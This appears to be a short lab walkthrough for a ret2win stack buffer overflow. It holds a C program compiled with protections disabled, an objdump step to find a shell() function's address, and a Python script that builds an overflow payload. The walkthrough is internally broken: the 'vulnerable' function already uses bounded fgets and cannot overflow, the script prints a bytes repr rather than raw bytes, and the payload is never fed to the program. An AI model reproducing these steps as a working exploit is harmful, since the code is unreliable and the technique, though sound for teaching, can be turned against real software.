nano vuln.c

#include <stdio.h> 
#include <string.h> 

void shell() { 
    printf("You have successfully executed the shell function!\n"); 
} 

void vulnerable_function() { 
    char buffer[64]; 
    printf("Enter some text: "); 
    
    // Replace gets() with fgets() for safety
    if (fgets(buffer, sizeof(buffer), stdin) != NULL) {
        // Remove newline character if present
        buffer[strcspn(buffer, "\n")] = '\0';
        printf("You entered: %s\n", buffer);
    }
} 

int main() { 
    vulnerable_function(); 
    return 0; 
}

gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie
objdump -d vuln | grep shell
(This command will display the address of the shell function. Note this address (e.g., 0x080484b6).)
nano exploit.py 
import struct 

# Address of the shell function 
shell_address = 0x080484b6 # Overwrite return address with shell function address

# Create the payload 
payload = b"A" * 64  # Fill the buffer
payload += b"B" * 4   # Overwrite saved EBP (if needed, depends on stack layout)
payload += struct.pack("<I", shell_address)  # Overwrite return address

# Print the payload 
print(payload)


ctrl+o,ctrl+x

./vuln

Open another terminal and run the Python script to generate the exploit payload

python3 exploit.py